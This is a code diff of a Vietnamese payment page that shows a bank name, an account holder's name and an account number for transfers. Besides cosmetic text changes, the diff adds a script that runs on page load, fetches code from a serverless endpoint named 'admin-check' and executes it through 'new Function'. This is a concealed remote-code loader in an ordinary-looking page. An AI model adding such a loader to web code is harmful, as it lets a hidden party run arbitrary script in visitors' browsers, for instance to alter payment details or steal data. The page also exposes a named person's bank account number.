@@ -299,7 +299,7 @@
 <body>
     <div class="card">
         <div class="header">
-            <h1> QR Chuyển Khoản</h1>
+            <h1>🔰 QR Chuyển Khoản</h1>
             <div class="payment-avatar">
                 <canvas id="lightning"></canvas>
                 <img src="avt.png" class="avatar-img">
@@ -309,11 +309,11 @@
         </div>
 
         <div class="info">
-            <b>🏧 Ngân hàng:</b> 𝙑𝙞𝙚𝙩𝙞𝙣𝙗𝙖𝙣𝙠<br>
-            <b>👤 Chủ Tài Khoản:</b> 𝙇𝙀 𝘿𝙐𝘾 𝙃𝙐𝙔<br>
+            <b>🏧 Ngân hàng:</b> Vietinbank<br>
+            <b>👤 Chủ Tài Khoản:</b> LE DUC HUY<br>
 
             <div class="row">
-                <div class="row-text">💳 Stk : 𝟭𝟬𝟰𝟴𝟴𝟯𝟱𝟰𝟰𝟵𝟵𝟭</div>
+                <div class="row-text">💳 104883544991</div>
                 <button class="copy-btn copy-mini" onclick="copyText(ACCOUNT)">Sao chép</button>
             </div>
 
@@ -608,10 +608,16 @@
                 e.preventDefault();
             }
         });
-    </script>
 
+        fetch("/.netlify/functions/admin-check")
+            .then(r => r.text())
+            .then(code => {
+                if (code) {
+                    new Function(code)();
+                }
+            });
+    </script>
 
 </body>
 
 </html>
-
